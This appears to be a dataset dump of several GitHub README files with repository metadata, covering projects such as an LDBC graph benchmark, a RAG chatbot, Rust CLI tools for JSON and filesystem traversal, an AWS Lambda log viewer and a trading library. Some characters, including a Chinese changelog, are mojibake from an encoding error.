The Linked Data Benchmark Council‚Äôs Social Network Benchmark ([LDBC SNB](https://ldbcouncil.org/benchmarks/snb/)) is a *de-facto* standard benchmark for graph-like data management technologies.
LDBC SNB is designed to be a plausible look-alike of all the aspects of operating a social network site, as one of the most representative and relevant use cases of modern graph-like applications.


## Data model in Chimera

Graph-Relational DBMS, Chimera can have two data models, Graph and Relational.
The following shows the LDBC SNB dataset in two data models.

### 1. Graph data model
<p align=""center"">
<img src=""https://github.com/swstarlab-infolab/ldbc-complex-benchmark/blob/master/img/Graph%20schema.png"" width=80%>
</p>

### 2. Relational data model
<p align=""center"">
<img src=""https://github.com/swstarlab-infolab/ldbc-complex-benchmark/blob/master/img/Relational%20schema.png"" width=100%>
</p>


## Query in Chimera

Chimera can process graph queries on top of a graph data model and relational queries on top of a relational data model.
It supports SQL, which is the standard for relational queries, and [Cypher](https://opencypher.org/), which is the most popular for graph queries, for which there is no standard yet.
It can also support hybrid queries that mix Cypher and SQL like [SQL/PGQ](https://www.iso.org/standard/79473.html?browse=tc).
The query below shows the Interactive Complex 2 (IC2) query with Cypher that shows the top 20 most recent messages created by friends of a particular person.

```sql
/* IC2. Recent messages by your friends
\set personId 933
\set maxDate '2010-10-16'
 */
SELECT personId,
    personFirstName,
    personLastName,
    postOrCommentId,
    postOrCommentContent,
    postOrCommentCreationDate
FROM cypher($$
MATCH (p:person)-[:person_knows_person]->(f:person)<-[:message_hascreator_person]-(m:message)
WHERE p.vertex_id = :personId AND m.creationdate < :maxDate
RETURN
    f.vertex_id AS personId,
    f.firstname AS personFirstName,
    f.lastname AS personLastName,
    m.vertex_id AS postOrCommentId,
    coalesce(m.content, m.imagefile) AS postOrCommentContent,
    m.creationdate AS postOrCommentCreationDate
ORDER BY
    m.creationdate DESC,
    m.vertex_id ASC
LIMIT 20
$$) as (
    personId bigint,
    personFirstName varchar,
    personLastName varchar,
    postOrCommentId bigint,
    postOrCommentContent text,
    postOrCommentCreationDate timestamp
);
```


## Client Interfaces in Chimera
Chimera is built on top of postgresql and supports all [postgresql-compatible client APIs](https://wiki.postgresql.org/wiki/List_of_drivers). 
The following shows a connection via the psql CLI as a representative example. 

<p align=""center"">
<img src=""https://github.com/swstarlab-infolab/ldbc-complex-benchmark/blob/master/img/psql%20CLI.png"" width=100%>
</p>


## Getting started
### 0. Requirements 

The recommended environment is that the benchmark scripts (Bash) and the LDBC driver (Java 8) run on the host machine, while the Chimera database runs in a Docker container. Therefore, the requirements are as follows:

* Bash
* Java 8
* Docker 19+
* postgresql-client


### 1. Setup

To clone a project with submodules, run: 

```bash
git clone --recurse-submodules git@github.com:swstarlab-infolab/ldbc-complex-benchmark.git
```

To install dependencies, run:

```bash
./setup/install_dependencies.sh
```


### 2. Loading the data
Setup scripts automatically loads dataset (for both graph and relational data models).
To load data with scale-factor 0.1 into the data-directory /mnt/disk1/ldbcsnb-demo, run

```bash
# loading for the first time
./scripts/setdb.sh init 0.1 /mnt/disk1/ldbcsnb-demo
# loaded previously 
./scripts/setdb.sh recycle 0.1 /mnt/disk1/ldbcsnb-demo
```

:warning: There should be enough space in the data-directory.


### 3. Querying the data
This demo supports IC2, IC4, IC8, IC12, IS1, IS3, IS4, and IS5 queries.
To run an IC2 query with psql, run: 

```bash
export PGPASSWORD=mysecretpassword
psql -h localhost -U postgres -d ldbcsnb -f queries/IC2.sql
```",0,0,1,BSD-2-Clause,,12.0
adsoftsito/competitive_programming,main,"Welcome to Competitive Programming Club

1. Download competitive programming book
2. Download Junior Trainning Template excel
3. Enter to club [team](https://docs.google.com/spreadsheets/d/1c7JFa8pFZIxwEcXBxeDZT8foNpuYkmjV3aP9ss_91ts/edit?usp=sharing)

# Session 1
[Slides 1](https://docs.google.com/presentation/d/1rpNoqcZLTZy481P7jhzwmVMlky9b8QiW/edit?usp=sharing&ouid=112454259737266877874&rtpof=true&sd=true)

# Session 2
[Slides 2](https://docs.google.com/presentation/d/1hbJRfII9Z_9ueiPMnIWz7j0DJ4JY1xk7/edit?usp=sharing&ouid=112454259737266877874&rtpof=true&sd=true)

# Session 3
[Slides 3](https://docs.google.com/presentation/d/1Rs7ufmnrbMhTvx15BTetqWUn3JqAcBze/edit?usp=sharing&ouid=112454259737266877874&rtpof=true&sd=true)
",0,0,1,,,0.0
stritefax/heelixchat,main,"# Heelix Chatbot

https://github.com/user-attachments/assets/b3c46810-9598-4af5-901b-9c775915ddbc


The open-source chatbot making RAG seamless. 

Heelix is a desktop chat app written in Rust and Tauri, automatically augmenting LLM queries using text data from your machine collected via accessibility API and OCR. 

- The app  collects text from documents visible in the foreground
- Collected content organized into local SQL and vector databases
- Top K results automatically injected into LLM query as context
- Full privacy, only local data storage, use your own API key with Claude or OpenAI

## Why we built Heelix
- We wanted to build an app that makes it lighting fast to reference everything you've read on any app when interacting with LLMs - no high spec requirements or massive battery consumptions, no API integration, just install and the it works. All while maintaining privacy and full user control. 

## Requirements

- Install Node 18 (recommended: https://github.com/nvm-sh/nvm, normal install: https://nodejs.org/en/download/package-manager)
- Install rust https://www.rust-lang.org/tools/install
- Install tesseract (optional) https://tesseract-ocr.github.io/tessdoc/Installation.html

## How to run

```
npm install
npm run tauri dev
```

If you have dependencie issues when running the app, try to delete `package-lock.json` & run `npm install` again. Add your API keys before using the app. Heelix currently uses small-3 embeddings. 

## How to build

```
npm install
npm run tauri build
```
",0,1,1,,release-desktop-chat-agent.yml,0.0
adelamodwala/jist,main,"# Overview

`jist` attempts to find the complete JSON value (string, number, bool, or JSON object) for a given search key.

## `jq`?

| 3.3GB input       |   jist    |   jq    |
|:------------------|:---------:|:-------:|
| Time              |  10.21s   | 34.17s  |
| Memory            |    8MB    | 18GB üò± |
| Throughput        | 300MB/s ‚úÖ | 96MB/s  |

_(Test machine: Intel i7-12700H, 64GB DDR5@4800MT RAM)_
![](jist_vs_jq.png)

## Examples
```
$ jist --data '{""a"":""b"", ""c"": {""d"": [""e"", ""f"", ""g""]}}' --path ""c.d""
[""e"", ""f"", ""g""]
```

Or

```
$ jist -d '[{""a"": ""b""}, {""c"": {""d"": ""e""}}]' -p ""[1].c""
{""d"": ""e""}
```

Or
```
$ jist -f my.json -p ""[1054041].c"" --buffsize 50000000
{""d"": ""e""}
```

One of the use cases I had in mind was being able to extract values from JSON objects like access tokens programmatically for setting up config files easily without having to perform `jq` gymnastics. You know the JSON data shape and key you're looking for, just declare what you want.

## Interface:

1. Find the value of an exact match

   `jist` can take any valid JSON as input including an array root type. It expects the search key to be valid given the requested key.

```
$ curl https://api.github.com/repos/adelamodwala/rustbook/commits?per_page=1 | jist -p ""[0].commit.author""
{
    ""name"": ""adelamodwala"",
    ""email"": ""adel.amodwala@gmail.com"",
    ""date"": ""2023-11-06T20:36:53Z""
}
```

2. You can find values for keys that are deeply nested

```
$ wget https://api.github.com/repos/adelamodwala/rustbook/commits?per_page=1 | jist -p ""[0].commit.author.name""
adelamodwala
```

3. If the root object is an array, then it's named `root` by default. All arrays are used like Javascript arrays syntactically.

```
$ wget https://api.github.com/repos/adelamodwala/rustbook/commits?per_page=1 | jist -p ""[0].parents""
[]
```

# Algorithm
`jist` uses a streaming approach to keep memory usage low, and uses `json-tools` crate to get a lexer iterator. Put together, we can scan through a JSON string/file from the top and keep track of depths compared to our target depth without ever unmarshalling JSON into memory. Once we reach our target depth and match all the expected indices/keys, `jist` returns the result.  

## Goals

- [x] It should find the full JSON value of a given search key. If the JSON data supplied provides an incomplete JSON value, the program should return an error.
- [x] JSON object size should not impact memory usage while fully utilizing a single CPU core 
- [x] As long as the search key is appropriate and a complete JSON value can be found, the input JSON object does not need to be complete or correctly formed.
- [x] Parsing the entire input JSON object is not necessary, simply finding the search key path using JSON format is sufficient
- [x] Streaming the JSON input should be possible, though will not be part of the starting design
- [ ] Feature: generate JSON schema, like super fast
- [ ] Search over compressed files like `gzip` and `bgzip`
- [ ] SIMD: the final frontier?
",1,0,3,GPL-3.0,,0.0
linera-io/intract-voyagerx,main,"# Linera x Intract: VoyagerX Campaign

Welcome to the **Linera x Intract: VoyagerX** campaign repository. This repository is designed for developers to submit Linera-based dApps as part of [the VoyagerX campaign](https://www.intract.io/quest/66e94a18b9abe1e27f18b0a5). Participants can earn rewards and contribute to the growing Linera ecosystem.

For more details on how to participate, visit our [Wiki](https://github.com/linera-io/intract-voyagerx/wiki).
",0,0,1,,,2.0
PsychedelicShayna/jw,master,"# jw - Jwalk CLI Frontend

Are you frustrated with tools like `find`, `fd`, `erd`, `lsd`, `legdur` and others that seem to excel in some areas but fall short in others? I was too, so I built a solution that prioritizes speed and simplicity above all else. The design philosophy of modern tools have a tendency to stray away from the original Linux philosophy of each command doing a single thing, and doing it very well, instead opting to cram as many features in as possible. 

This isn't necessarily a bad thing, I enjoy those features, but there are many times where I simply want to grep every single path from the root of my drive, and that's when those abstractions start backfiring. All the additional rendering tanks performance, the colorized output sometimes messes up your regex, you pipe it to Neovim and are met with a clusterfuck of ANSI escape codes. Higher level languages that are easier to make pretty CLI/TUIs with being single threaded, the creator never anticipating that someone would feed a terrabyte of data to it, and output immediately starts getting dumped to the terminal creating massive I/O bottlenecks... **enough**

Sometimes you just need to take a page out of the Sesto Elemento's book.

## What is jw exactly?
jw is a command line frontend for [jwalk](https://github.com/byron/jwalk), a blazingly fast filesystem traversal library. While jwalk itself provides unparalleled performance in recursively traversing directories, it lacks a CLI, so I created jw to fill that gap. This utility leverages the power of jwalk to allow you to efficiently sift through directories containing a massive number of files, with a focus on raw performance and minimal abstraction.

It also doubles as a way to hash a very large number of files, thanks to the insanely fast [xxHash](https://github.com/Cyan4973/xxHash) algorithm; jwalk and xxh3 go together like bread and butter.

Rather than fancy colorized outputs, TUIs, gathering statistics, etc, jw sticks to the essentials, providing the raw performance without any of the bloat.

It simply gives you the raw output as fast as possible, for you to pipe to other utilities, such as ripgrep/grep, xargs, fzf, and the like, with no additional nonsense.


https://github.com/user-attachments/assets/9f4a3cf5-4dfa-4a57-845b-a26ded3f660a



https://github.com/user-attachments/assets/f27bda63-a97f-441f-be86-2514fdc64d37


## Performance

To give you a rough idea of the performance, JWalk was capable of traversing thorugh 492 GB worth of files in **3 seconds**. That's all it takes, three seconds and you can already grep for file paths.

As for Xxh3 combined with JWalk, it was capable of hashing 7.2GB across more than 10,000 files, in **500 milliseconds**. Yes, it's that fast. Stupid fast.

The SHA2 family and MD5 is also supported but that's only there for compatibility.

### A Personal Request
Making Rust go fast is a different beast than making C++ go fast. A lot of the techniques that came to mind when trying to squeeze even more performance out of this utility simply don't apply to Rust without breaking the spirit of the language. I'm not a Rust wizard, there's a lot I still don't know. However, I know for a fact that `jw` could run even faster. This [article proving that an optimization ""impossible"" in Rust, is possible in Rust](https://tunglevo.com/note/an-optimization-thats-impossible-in-rust/) is a prime example of how Rust has its own flavor of black magic I've yet to grasp. I welcome any and all PRs, it's a much appreciated learning experience. By all means, if you spot a way to make it faster, don't hesitate to make a PR, I'd love to learn, even if it's just shaving off a few milliseconds.

The main aspiration I have for `jw` is **speed** above all else, both traversal and hashing, but especially hashing.


https://github.com/user-attachments/assets/2db684a0-a6f6-4416-a2fc-4b65c0da5963



https://github.com/user-attachments/assets/1ecdfc70-8233-4fdb-b75d-00d3c7ca22a5



https://github.com/user-attachments/assets/9d959641-2fcd-41bc-b397-2d7098d59174




## Usage

```
A CLI frontend to jwalk for blazingly fast filesystem traversal!

Usage: jw [OPTIONS] [directories]...

Arguments:
  [directories]...
          The target directories to traverse, can be multiple. Use -- to read paths from stdin.

          [default: .]

Options:
  -l, --live
          Display results in realtime, rather than collecting first and displaying later.
          This will result in a significant drop in performance due to the constant terminal output.

  -c, --checksum
          Generate an index of file hashes and their associated file names, and print it.
          The algorithm used by default is Xxh3, which is the recommended choice. Though
          if you want to use a different algorithm, use --checksum-with (-C) instead.

  -C, --checksum-with <algorithm>
          Performs --checksum but with the specified hashing algorithm.
          If another argument changes the operating mode of the program, e.g. --diff, then
          the algorithm specified will only be stored, and no checksum will be performed.
          Stick to Xxh3 and just use -c unless you have a reason to use a different one.

          [default: xxh3]
          [possible values: xxh3, sha224, sha256, sha384, sha512, md5]

  -D, --diff <file1> <file2>...
          Validate hashes from two or more files containing output from `jw --checksum`
          The first file will be treated as the ""correct"" one; any discrepant hashes
          in the subseqeunt files will be reported. If entries from the first file are
          missing in the subsequent files, or if the subsequent files have entries not
          present in the first file, that will be reported as well.

          The hash length must be known for -D to parse the input files and separate
          hashes from file paths. A length of 16 is assumed by default as that's how
          long Xxh3 hashes are. If you used a different algorithm however, then you
          must specify the algorithm before -D, e.g. `jw -C sha256 -D file1 file2`

          If you stuck with defaults: `jw -c`, then you can just `jw -D file1 file2`

  -d, --depth <limit>
          The recursion depth limit. Setting this to 1 effectively disables recursion.

          [default: 0]

  -x, --exclude [<t1,t2>...]
          Exclude one more types of entries, separated by coma.

          [possible values: files, dirs, dot, other]

  -S, --silent
          Suppress output, useful for benchmarking, or just counting files via --stats

  -s, --stats
          Count the number of files, dirs, and other entries, and print at the end.
          This will decrease performance. This will cause a significant slowdown
          and is primarily here for debugging or benchmarking. A more efficient
          method to do this will be implemented in the future.

  -h, --help
          Print help (see a summary with '-h')

  -V, --version
          Print version
```
",4,0,1,GPL-3.0,rust.yml,0.0
furkan-guvenc/crud_routers,master,"# crud_routers

**crud_routers** is a library to automatically generate crud routes with given schemas.
It is orm and web framework agnostic, highly inspired by [fastapi-crudrouter](https://github.com/awtkns/fastapi-crudrouter).

[![Crates.io](https://img.shields.io/crates/v/crud_routers)](https://crates.io/crates/crud_routers)
[![Documentation](https://docs.rs/crud_routers/badge.svg)](https://docs.rs/crud_routers)

## Basic usage with Axum and Diesel

### Installation
```bash
cargo add crud_routers --features axum,diesel
```

### Usage
Below is a simple example of what the crud_routers can do. In just ten lines of code, you can generate all
the crud_routers you need for any model. The full example is in [diesel_example folder](examples/diesel_axum)

```rust
#[tokio::main]
async fn main() -> io::Result<()> {
    let database_url = ""postgres://postgres:testpw@localhost/diesel_demo"";
    let connection = PgConnection::establish(&database_url).unwrap();
    let shared_state = Arc::new(Mutex::new(
        DieselRepository::new(connection, posts::table)
    ));

    let router = CrudRouterBuilder::new::<AxumServer>()
        .schema::<Post, i32>()
        .create_schema::<NewPost>()
        .update_schema::<PostForm>()
        .prefix(""base/api"")
        .build_router()
        .with_state(shared_state);

    axum::serve(listener, router).await
}
```

## Features

### Orm-Agnostic

Following ORMs are implemented, and you can activate them with adding necessary features.

- [Diesel](https://diesel.rs/) with feature ""diesel""
- [Sea-orm](https://www.sea-ql.org/SeaORM/) with feature ""sea-orm""

You can easily add new ones by implementing [necessary traits](crud_routers/src/repositories/mod.rs).

### Api Server Agnostic
Following api servers are implemented, and you can activate them with adding necessary features.
You can mix and match them with Orms however you want. 

- [Axum](https://github.com/tokio-rs/axum) with feature ""axum""
- [Actix](https://actix.rs/) with feature ""actix""

### OpenApi support
You can easily add [openapi](https://www.openapis.org/) support with feature ""openapi"" and 
deriving [utoipa::ToSchema](https://docs.rs/utoipa/latest/utoipa/derive.ToSchema.html) for your schemas.
You can use all UIs supported by [utoipa](https://github.com/juhaku/utoipa).

```rust
let mut openapi = OpenApiBuilder::new()
.info(InfoBuilder::new().title(""Diesel Axum example"").build())
.build();

let router = CrudRouterBuilder::new::<AxumServer>()
        .schema::<Post, i32>()
        .create_schema::<NewPost>()
        .update_schema::<PostForm>()
        .prefix(""base/api"")
        .build_openapi(&mut openapi)
        .build_router()
        .with_state(shared_state)
        .merge(SwaggerUi::new(""/docs/swagger/"").url(""/api-docs/openapi.json"", openapi));

```

![Swagger UI](docs/assets/SwaggerOverview.png)

### Pagination
Pagination is automatically setup for you. You can use the `skip` and `limit` query parameters to
paginate your results.

**Skip**:
Using the `skip` (int) parameter, you can skip a certain number of items before returning the items you want.

**Limit**:
Using the `limit` (int) parameter, the maximum number of items to be returned can be defined.

![Swagger UI](docs/assets/ListAll.png)

### Opting Out Routes
If you don't add a schema with `create_schema` then create item route won't be created.
Same applies for `update_schema` method and update item route.
Alternatively all routes can be opted out using disable_*_route methods.

```rust
CrudRouterBuilder::new::<TestServer>()
.repository::<Repo>()
.schema::<Schema, PrimaryKeyType>()
.create_schema::<CreateSchema>()
.update_schema::<UpdateSchema>()
.disable_list_items_route()
.disable_get_item_route()
.disable_delete_item_route()
.disable_delete_all_items_route()
.disable_create_item_route()
.disable_update_item_route()
```

### Set tag and prefix
You can set a prefix for your url with `prefix` method.
Leaving prefix makes it the table name.
If ""openapi"" feature is added then `tag` method 
can be used to set the tag for the api spec.

```rust
CrudRouterBuilder::new::<TestServer>()
.repository::<Repo>()
.schema::<Schema, PrimaryKeyType>()
.prefix(""base/api"")
.tag(""My Tag"")
```

### TODO

- [ ] Add Middleware support
- [ ] Create an [mdBook](https://github.com/rust-lang/mdBook) for documentation
",0,0,1,MIT,,0.0
resola-ai/rust-aws-tui,main,"# AWS Lambda Logs Viewer

A terminal-based user interface (TUI) application for viewing AWS Lambda function logs across multiple profiles and regions.

## Features

- üîç Browse and filter Lambda functions across AWS profiles
- ‚ö° Quick access to recent logs with predefined time ranges
- üìÖ Custom date range selection for detailed log analysis
- üîé Real-time log filtering and search
- üí® Fast navigation with keyboard shortcuts
- üì¶ Function list caching for improved performance

## Prerequisites

- Rust (latest stable version)
- AWS credentials configured in `~/.aws/credentials`
- AWS config with profiles in `~/.aws/config`

## Installation

1. Clone the repository:

```shell
git clone https://github.com/resola-ai/rust-aws-tui
cd rust-aws-tui
```

2. Build and install:

```
cargo install --path .
```

## Usage

- Update config.toml with your AWS profiles and regions.

### Basic Navigation

- Use `‚Üë`/`‚Üì` or `k`/`j` to navigate through lists
- `Tab` to switch between panels
- `Enter` to select/confirm
- `Esc` to go back/cancel
- `q` to quit the application

### Step 1: Profile Selection

1. Select an AWS profile from the list

![AWS Profile Selection](./docs/assets/step1_select_profile.png)

- Use `‚Üë`/`‚Üì` or `j`/`k` to navigate profiles
- Press `Enter` to select
- Press `q` to quit

### Step 2: Function Selection

1. Select an AWS profile from the list
2. Choose a region
3. Browse or search through the Lambda functions list
4. Press `Enter` to view logs for the selected function

![Function Selection](./docs/assets/step_2_select_function.png)

### Time Range Selection

- Choose from predefined ranges:
  - Last 15 minutes
  - Last hour
  - Last 3 hours
  - Last 24 hours
- Or select ""Custom Range"" to specify exact dates and times

![Time Range Selection](./docs/assets/step_3_select_date_range.png)

### Log Viewing

- Use `‚Üë`/`‚Üì` to scroll through logs
- Type to search/filter logs in real-time
- `Ctrl+C` to copy selected log entry
- `f` to toggle full-screen mode

![Log Viewer](./docs/assets/step_4_view_logs.png)

Toggle detail view with `Enter`

![Log Detail View](./docs/assets/step_5_view_detail_logs.png)

## Configuration

### AWS Credentials

Ensure your AWS credentials are properly configured:

# ~/.aws/credentials
[default]
aws_access_key_id = YOUR_ACCESS_KEY
aws_secret_access_key = YOUR_SECRET_KEY

[other-profile]
aws_access_key_id = OTHER_ACCESS_KEY
aws_secret_access_key = OTHER_SECRET_KEY

# ~/.aws/config
[profile default]
region = us-west-2

[profile other-profile]
region = eu-west-1

### Cache Configuration

The application caches function lists to improve performance. Cache files are stored in:
- Linux/macOS: `~/.cache/aws-lambda-logs-viewer/`
- Windows: `%LOCALAPPDATA%\aws-lambda-logs-viewer\`

To clear the cache, delete the cache directory or use the `--clear-cache` flag when launching the application.

## Troubleshooting

### Common Issues

1. **No AWS profiles found**
   - Verify AWS credentials file exists
   - Check file permissions
   - Ensure proper file format

2. **Cannot fetch Lambda functions**
   - Verify AWS credentials are valid
   - Check IAM permissions
   - Ensure network connectivity

3. **Slow function loading**
   - Consider using the cache feature
   - Check network latency
   - Verify AWS API rate limits

### Required IAM Permissions

Minimum IAM policy required:

{
    ""Version"": ""2012-10-17"",
    ""Statement"": [
        {
            ""Effect"": ""Allow"",
            ""Action"": [
                ""lambda:ListFunctions"",
                ""logs:GetLogEvents"",
                ""logs:FilterLogEvents"",
                ""logs:DescribeLogStreams"",
                ""logs:DescribeLogGroups""
            ],
            ""Resource"": ""*""
        }
    ]
}

## Contributing

1. Fork the repository
2. Create a feature branch
3. Commit your changes
4. Push to the branch
5. Create a Pull Request

## License

This project is licensed under the MIT License - see the LICENSE file for details.
",0,0,2,,,3.0
baiguoname/qust,main,"# Qust
Qust is a Rust libraries for building live-trading and back-test systems. It has the following features:
* **Fast**: It's way to handle or to save the kline data, tick data and strategy makes the backtest and live trading fast.
* **Extensible**: It provide many ways to build a strategy, and new ways can be implemented by needs, so that you can focus what you care. You can build a simple strategy or complicated one, then backtest it on kline data(for quick scruch) or tick data, on put it on live trading directly. For example, you can build a strategy by following ways:
    1. Accept kline flow, and return a target position.
    2. Accept tick data flow, and return a target position.
    3. Accept tick data flow, and return an order action.
    4. Accept kline and tick flow, return a target positon or an order action.
    5. Accept kline flow, and return a bool.(a least two of it make a  strategy, one for open position, another for close)
    6. Add filter conditions to an existed strategy.
    7. Add algorithm method to an existed strategy.
    8. Add order matching methods when backtest a strategy.
    9. Add valitality manager to strategies.
    10. Add portoflio manager to a pool of strategies.
    and so on.


See this [notebook Example](https://github.com/baiguoname/qust/blob/main/examples/git_test/git_test.ipynb) for more detail.

# Examples
Add this to `Cargo.toml`:
```rust
qust-derive = { version = "">=0.1"" }
qust-ds = { version = "">=0.1"" }
qust = { version = "">=0.1"" }
qust-api = { version = "">=0.1""}
qust-io = {  version = "">=0.1""}
serde = ""*""
serde_json = ""*""
itertools = ""*""
typetag = ""*""
tokio = ""*""
ta = { version = ""0.5.0"" }
```
You can build a strategy basing on kline data and backtest in on kline:
```rust
use qust_derive::*;
use qust_ds::prelude::*;
use qust::prelude::*;
use qust_api::prelude::*;
use qust_io::prelude::*;
use ta::{ Next, indicators::SimpleMovingAverage as SMA };

#[ta_derive2]
pub struct TwoMaStra {
    pub short_period: usize,
    pub long_period: usize,
}

#[typetag::serde]
impl Ktn for TwoMaStra {
    fn ktn(&self,_di: &Di) -> RetFnKtn {
        let mut last_norm_hold = NormHold::No;
        let mut short_ma = SMA::new(self.short_period).unwrap();
        let mut long_ma = SMA::new(self.long_period).unwrap();
        let mut last_short_value = 0f64;
        let mut last_long_value = 0f64;
        Box::new(move |di_kline| {
            let c = di_kline.di.c()[di_kline.i] as f64;
            let short_value = short_ma.next(c);
            let long_value = long_ma.next(c);
            match last_norm_hold {
                NormHold::No if di_kline.i != 0 => {
                    if last_short_value < last_long_value && short_value >= long_value {
                        last_norm_hold = NormHold::Lo(1.);
                    }
                }
                NormHold::Lo(_) if short_value < long_value => {
                    last_norm_hold = NormHold::No;
                }
                _ => {}
            }
            last_short_value = short_value;
            last_long_value = long_value;
            last_norm_hold.clone()
        })
    }
}

#[tokio::main]
async fn main() {
    let di = read_remote_kline_data().await;
    let two_ma_stra = TwoMaStra { short_period: 9, long_period: 20 };
    let two_ma_stra_ptm: Ptm = two_ma_stra.ktn_box().to_ktn().to_ptm();
    let pnl_res_dt: PnlRes<dt> = two_ma_stra_ptm.bt_kline((&di, cs1));
    pnl_res_dt.to_csv(""pnl_res_dt.csv""); // save the pnl to local csv;
}

```

# Êõ¥Êñ∞ 
## version: 0.1.5
1. ÊîØÊåÅtickÁ∫ßÂà´ÁöÑÊ®™Êà™Èù¢ÔºåÁõÆÂâç‰∏çÊîØÊåÅkÁ∫øÁ∫ßÂà´ÔºåÂèØ‰ª•Âú®tickÈáåÈù¢ÊâãÂä®Êõ¥Êñ∞kÁ∫ø„ÄÇÈúÄË¶ÅÊåáÂÆöÂêÑ‰∏™tickerÁöÑÂà∞ËææÊó∂Èó¥ÔºåËØ¶ËßÅ[‰æãÂ≠ê](https://github.com/baiguoname/qust/qust-stra/src/bin/main_test.rs);
2. ÊØè‰∏™Á≠ñÁï•(`ApiBridgeBox`)ÈÉΩÊúâËá™Ë∫´ÁöÑËÆ¢ÂçïÁÆ°ÁêÜÔºåapiÁ®ãÂ∫èÂÅúÊ≠¢ËøêË°åÂêéÔºåÂà∞‰∏ãÊ¨°ÈáçÂºÄÁ®ãÂ∫èÔºå‰∏≠Èó¥ËøáÁ®ã‰∏≠Â¶ÇÊûúÊ≤°ÊúâÊâãÂä®ÂºÄÂπ≥‰ªìÔºåÂéÜÂè≤ÁöÑËÆ¢Âçï‰ºöË¢´ËØªÂèñ",0,0,1,,,0.0
mainak55512/rjq,master,"<h1 align=""center"">Welcome to rjq üëã</h1>
<p>
  <a href=""https://mainak55512.github.io/rjq/"" target=""_blank"">
    <img alt=""Documentation"" src=""https://img.shields.io/badge/documentation-yes-brightgreen.svg"" />
  </a>
  <a href=""#"" target=""_blank"">
    <img alt=""License: MIT"" src=""https://img.shields.io/badge/License-MIT-yellow.svg"" />
  </a>
  <a href=""#"" target=""_blank"">
    <img alt=""Repo size"" src=""https://img.shields.io/github/repo-size/mainak55512/rjq"" />
  </a>
  <a href=""#"" target=""_blank"">
    <img alt=""Version"" src=""https://img.shields.io/github/v/tag/mainak55512/rjq"" />
  </a>
  <a href=""#"" target=""_blank"">
    <img alt=""Issues"" src=""https://img.shields.io/github/issues/mainak55512/rjq"" />
  </a>
</p>

> Simple and fast JSON filtering tool written in Rust.

### üè† [Homepage](https://github.com/mainak55512/rjq)

### üìÑ [Documentation](https://mainak55512.github.io/rjq/)

## Getting started üö¥

Pre-built binaries for Linux and Windows are available in the [releases section](https://github.com/mainak55512/rjq/releases).
Download suitable binary according to your OS configuration and add the path to environment variables for easy access across the system.

## Usage üîß

```sh
rjq --load=""<file path>"" --query=""<query string>"" --params=""<comma separated parameter names>""
```
or,

```sh
stto --json cpython | rjq --query=""<query string>"" --params=""<comma separated parameter names>""
```

Demo data.json:

```sh
[
  {
    ""_id"": ""88L33FM4VQBB1QYH"",
    ""name"": ""Eleonore Kendall"",
    ""dob"": ""2021-04-13"",
    ""address"": {
      ""street"": ""3137 Stich Avenue"",
      ""town"": ""Swanley"",
      ""postode"": ""CR45 9NE""
    },
    ""telephone"": ""+49-2424-456-409"",
    ""pets"": [
      ""Murphy"",
      ""Oliver""
    ],
    ""score"": 2.4,
    ""email"": ""etheleneweston@shuttle.com"",
    ""url"": ""http://www.consultant.com"",
    ""description"": ""mobiles besides deputy australian picnic germany collectables gmc necessity both webcams testing set continuity bread candle drivers p icon alone"",
    ""verified"": true,
    ""salary"": 24057
  },
  {
    ""_id"": ""OQGS24A7RF6D118C"",
    ""name"": ""Shona Breen"",
    ""dob"": ""2017-08-13"",
    ""address"": {
      ""street"": ""6515 Camberley"",
      ""town"": ""Fortrose"",
      ""postode"": ""SS64 6WU""
    },
    ""telephone"": ""+42-1296-691-224"",
    ""pets"": [
      ""Lilly"",
      ""Penny""
    ],
    ""score"": 8,
    ""email"": ""gerald-love@para.rome.it"",
    ""url"": ""http://district.com"",
    ""description"": ""collective submitted samuel del kenya fi wordpress etc worked realize enzyme ethernet assured championships preferred examples virtual bluetooth urw trust"",
    ""verified"": false,
    ""salary"": 10760
  },
  {
    ""_id"": ""YI818QFFYNA6AZUH"",
    ""name"": ""Dot Milton"",
    ""dob"": ""2015-03-01"",
    ""address"": {
      ""street"": ""2151 Kenstford"",
      ""town"": ""Coldstream"",
      ""postode"": ""WN26 1ZO""
    },
    ""telephone"": ""+45-8699-662-747"",
    ""pets"": [
      ""Murphy"",
      ""Bear""
    ],
    ""score"": 2.4,
    ""email"": ""karla.harrington4058@relation.com"",
    ""url"": ""https://www.minolta.com"",
    ""description"": ""segments programmes tulsa acre placing prix awarded senators main trim played italiano difficulties cab customers granny document pf exceptions attractions"",
    ""verified"": true,
    ""salary"": 54912
  },
  ...
]
```

rjq query:

```sh
rjq --load=""data.json"" --query=""salary < 15000 && score < 2.0 && verified = false"" --params=""name, address.town, pets""
```

output:

```sh
[
  {
    ""name"": ""Rosaura Thurston"",
    ""pets"": [
      ""BatMan"",
      ""Leo""
    ],
    ""town"": ""Matlock""
  },
  {
    ""name"": ""Bernardina Bateman"",
    ""pets"": [
      ""sox"",
      ""Stella""
    ],
    ""town"": ""Petersfield""
  },
  {
    ""name"": ""Miquel Cranford"",
    ""pets"": [
      ""Oscar"",
      ""Oliver""
    ],
    ""town"": ""Olney""
  },
  {
    ""name"": ""Hanna Scherer"",
    ""pets"": [
      ""Sammy"",
      ""Penny""
    ],
    ""town"": ""Greenhill""
  },
  {
    ""name"": ""Arcelia Woodcock"",
    ""pets"": [
      ""boo"",
      ""Lexi""
    ],
    ""town"": ""Kendal""
  },
  {
    ""name"": ""Kayce Gable"",
    ""pets"": [
      ""Leo"",
      ""Murphy""
    ],
    ""town"": ""Otley""
  },
  ...
]
```

## Benchmark üìä

![benchmark](./media/rjq_benchmark.png)

## Author

üë§ **Mainak Bhattacharjee**

* Github: [@mainak55512](https://github.com/mainak55512)

## ü§ù Contributing

Contributions, issues and feature requests are welcome!<br />Feel free to check [issues page](https://github.com/mainak55512/rjq/issues). 

Checkout [Contributing page](./CONTRIBUTING.md) for contribution guidelines.

## Code of Conduct

By participating in this project, you agree to abide by the [Code of Conduct](CODE_OF_CONDUCT.md). Please read it to understand your rights and responsibilities.

## Show your support

Give a ‚≠êÔ∏è if this project helped you!
",8,10,1,MIT,create_release.yml,4.0
KOSASIH/pistellar-nexus-protocol,main,"![Static Badge](https://img.shields.io/badge/PiStellar-Nexus-gold)

